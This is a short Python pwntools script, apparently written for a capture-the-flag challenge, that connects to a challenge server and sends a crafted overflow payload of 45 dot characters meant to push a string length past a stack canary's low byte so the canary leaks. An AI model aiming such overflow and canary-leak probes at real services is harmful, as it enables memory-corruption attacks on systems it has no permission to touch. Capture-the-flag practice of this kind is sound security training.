from pwn import remote, context
context.log_level = "info"

HOST, PORT = "chal.secso.cc", 4003

def one(payload, tag):
    io = remote(HOST, PORT)
    data = io.recvrepeat(1.0)
    io.send(payload)
    data += io.recvrepeat(2.0)
    io.close()
    print(f"\n===== {tag} =====")
    print("payload:", payload)
    print("---- output ----")
    print(data.decode(errors="replace"))
    print("---- hexdump of Key line region ----")
    print(data)

# 1) normal example
one(b'{"key|description":{}}\n', "normal")

# 2) overflow key with 45 invalid chars ('.') to push strlen past canary LSB
payload = b'{"' + b'.'*45 + b'|":{}}\n'
one(payload, "overflow-45-dots")
